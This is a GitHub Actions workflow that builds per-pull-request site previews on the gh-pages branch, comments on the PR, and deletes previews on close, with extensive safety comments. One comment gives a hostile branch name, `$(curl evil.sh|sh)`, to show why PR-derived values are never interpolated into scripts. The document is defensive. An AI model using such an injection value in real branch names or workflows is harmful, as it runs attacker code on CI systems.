name: PR preview

# Every pull request gets its own copy of the site in a subdirectory of the
# `gh-pages` branch:
#
#   gh-pages:pr/<number>/  ->  https://typewell.net/pr/<number>/
#
# and a single sticky comment on the PR pointing at it. Closing or merging the
# PR deletes the directory again.
#
# SAFETY
# ------
# The trigger is `pull_request`, never `pull_request_target`. A pull_request run
# from a fork gets a read-only token and no access to repository secrets, so a
# malicious PR cannot write to gh-pages. The same-repo guard on every job below
# is the second layer: fork PRs are skipped outright rather than failing halfway
# through a deploy.
#
# Nothing derived from the PR (title, branch name, author) is ever interpolated
# into a run: or script: block with ${{ }} - values go through env: and are read
# back as "$VAR" / process.env. ${{ }} is substituted textually before the shell
# or Node ever runs, so a branch named `$(curl evil.sh|sh)` would otherwise
# execute.

on:
  pull_request:
    types: [opened, reopened, synchronize, closed]

permissions:
  contents: read

# Deliberately NOT the shared gh-pages group that deploy.yml uses. GitHub keeps
# only one *pending* run per group: if two PRs pushed while a production deploy
# was running, the older pending run would be cancelled outright, not queued,
# and that preview would silently serve stale content until someone pushed
# again. A silently-wrong preview is worse than a retried push. Per-PR groups
# still serialise a single PR's own pushes; races against deploy.yml are
# handled by the deploy action rebasing and retrying (force: false).
concurrency:
  group: gh-pages-pr-${{ github.event.pull_request.number }}
  cancel-in-progress: false

jobs:
  # ---------------------------------------------------------------- deploy --
  deploy:
    name: Publish preview
    if: >-
      github.event.action != 'closed' &&
      github.event.pull_request.head.repo.full_name == github.repository
    runs-on: ubuntu-latest
    permissions:
      contents: write # push the preview into the gh-pages branch
    outputs:
      url: ${{ steps.meta.outputs.url }}

    steps:
      - name: Checkout PR head
        uses: actions/checkout@v7.0.1
        with:
          persist-credentials: false

      - name: Resolve preview location
        id: meta
        env:
          PR_NUMBER: ${{ github.event.number }}
        run: |
          set -euo pipefail
          case "$PR_NUMBER" in
            ''|*[!0-9]*) echo "::error::PR number is not a plain integer"; exit 1 ;;
          esac
          {
            echo "dir=pr/$PR_NUMBER"
            echo "url=https://typewell.net/pr/$PR_NUMBER/"
          } >> "$GITHUB_OUTPUT"

      - name: Build preview
        run: |
          set -euo pipefail

          out=dist
          rm -rf "$out"
          mkdir -p "$out"
          cp index.html privacy.html terms.html "$out/"
          cp .nojekyll "$out/.nojekyll"

          # Previews deliberately get an EMPTY client ID. A preview lives at a
          # path Google has not been told about, so a real ID would only fail
          # the Authorized JavaScript origins check with a confusing error. With
          # the placeholder emptied the app falls back cleanly and the Drive
          # panel reads "not configured", which is the honest state. Everything
          # else in the app is fully testable. Test Drive against production.
          #
          # This is not a secrecy measure: the ID is public either way.
          sed -i 's|__GOOGLE_CLIENT_ID__||g' "$out/index.html"

          # No CNAME here. The custom domain belongs to the branch root and is
          # written by deploy.yml; a CNAME inside pr/<n>/ would do nothing.

          ls -la "$out"

          # A one-file payload for the step below. Kept separate from dist/ on
          # purpose: this is the only thing a preview run may write to the
          # branch root, and building it as its own directory makes that
          # impossible to get wrong by editing the build above.
          rm -rf seed
          mkdir -p seed
          cp .nojekyll seed/.nojekyll

      - name: Ensure gh-pages root has .nojekyll
        # A preview can be the very first thing ever pushed to gh-pages, in
        # which case the branch root has no .nojekyll and Jekyll would process
        # the whole branch. Only the ROOT copy affects Jekyll, and the step
        # after this one writes exclusively inside pr/<n>/, so seed it here.
        #
        # folder: seed contains nothing but .nojekyll and clean is false, so
        # this step can only add that one file - it can neither overwrite
        # production's index.html nor delete anything. It becomes a no-op ("no
        # files to commit") from the second run onwards.
        uses: JamesIves/github-pages-deploy-action@v4.8.0
        with:
          branch: gh-pages
          folder: seed
          clean: false
          force: false
          single-commit: false
          commit-message: "Ensure .nojekyll on gh-pages root"
          git-config-name: github-actions[bot]
          git-config-email: 41898282+github-actions[bot]@users.noreply.github.com

      - name: Deploy preview to gh-pages
        uses: JamesIves/github-pages-deploy-action@v4.8.0
        with:
          branch: gh-pages
          folder: dist
          # target-folder scopes the action's `rsync --delete` to this
          # directory, so `clean: true` here can only ever remove stale files
          # from THIS preview. It cannot reach the branch root.
          target-folder: ${{ steps.meta.outputs.dir }}
          clean: true
          force: false
          single-commit: false
          commit-message: "Deploy preview for PR #${{ github.event.number }}"
          git-config-name: github-actions[bot]
          git-config-email: 41898282+github-actions[bot]@users.noreply.github.com

  # ---------------------------------------------------------------- remove --
  remove:
    name: Remove preview
    if: >-
      github.event.action == 'closed' &&
      github.event.pull_request.head.repo.full_name == github.repository
    runs-on: ubuntu-latest
    permissions:
      contents: write # delete the preview directory from gh-pages

    steps:
      - name: Does gh-pages exist?
        id: branch
        env:
          GH_TOKEN: ${{ github.token }}
          REPO: ${{ github.repository }}
        run: |
          set -euo pipefail
          if gh api "repos/$REPO/branches/gh-pages" --silent 2>/dev/null; then
            echo "exists=true" >> "$GITHUB_OUTPUT"
          else
            echo "exists=false" >> "$GITHUB_OUTPUT"
            echo "gh-pages does not exist yet - nothing to remove."
          fi

      - name: Checkout gh-pages
        if: steps.branch.outputs.exists == 'true'
        uses: actions/checkout@v7.0.1
        with:
          ref: gh-pages
          fetch-depth: 0 # not shallow, so the push below is always accepted

      - name: Delete preview directory
        if: steps.branch.outputs.exists == 'true'
        env:
          PR_NUMBER: ${{ github.event.number }}
        run: |
          set -euo pipefail
          case "$PR_NUMBER" in
            ''|*[!0-9]*) echo "::error::PR number is not a plain integer"; exit 1 ;;
          esac

          dir="pr/$PR_NUMBER"
          if [ ! -d "$dir" ]; then
            echo "No preview at $dir - nothing to do."
            exit 0
          fi

          # Done with plain git rather than the deploy action: the action
          # protects .nojekyll from its own --delete, which would leave an
          # orphaned pr/<n>/.nojekyll behind on every closed PR.
          git config user.name 'github-actions[bot]'
          git config user.email '41898282+github-actions[bot]@users.noreply.github.com'
          git rm -rq -- "$dir"
          git commit -m "Remove preview for PR #$PR_NUMBER"

          # Serialised by the concurrency group above, but retry once anyway in
          # case a production deploy landed between fetch and push.
          git push origin gh-pages || {
            git pull --rebase origin gh-pages
            git push origin gh-pages
          }

  # --------------------------------------------------------------- comment --
  comment:
    name: Update preview comment
    needs: [deploy, remove]
    if: >-
      always() &&
      github.event.pull_request.head.repo.full_name == github.repository &&
      (needs.deploy.result == 'success' || needs.remove.result == 'success')
    runs-on: ubuntu-latest
    permissions:
      pull-requests: write # the sticky comment, and nothing else

    steps:
      - name: Post or update the sticky comment
        uses: actions/github-script@v9.0.0
        env:
          # Everything the script needs arrives through the environment. No
          # ${{ }} appears inside the script body: it would be pasted in as raw
          # JavaScript source before Node parses it.
          PREVIEW_URL: ${{ needs.deploy.outputs.url }}
          EVENT_ACTION: ${{ github.event.action }}
          COMMIT_SHA: ${{ github.event.pull_request.head.sha }}
        with:
          script: |
            const MARKER = '<!-- typewell-pr-preview -->';
            const { PREVIEW_URL, EVENT_ACTION, COMMIT_SHA } = process.env;
            const issue_number = context.issue.number;

            const body = EVENT_ACTION === 'closed'
              ? [
                  MARKER,
                  '### Preview removed',
                  '',
                  'The preview for this pull request has been deleted from `gh-pages`.',
                ].join('\n')
              : [
                  MARKER,
                  '### Preview ready',
                  '',
                  `**${PREVIEW_URL}**`,
                  '',
                  `Built from \`${COMMIT_SHA.slice(0, 7)}\`. Updates on every push; deleted when this PR closes.`,
                  '',
                  '> Google Drive backup is intentionally disabled in previews - the Drive panel',
                  '> reads "not configured". Everything else is the real app.',
                ].join('\n');

            const comments = await github.paginate(
              github.rest.issues.listComments,
              { ...context.repo, issue_number, per_page: 100 },
            );
            const existing = comments.find(
              (c) => c.user?.type === 'Bot' && c.body?.includes(MARKER),
            );

            if (existing) {
              await github.rest.issues.updateComment({
                ...context.repo, comment_id: existing.id, body,
              });
            } else {
              await github.rest.issues.createComment({
                ...context.repo, issue_number, body,
              });
            }
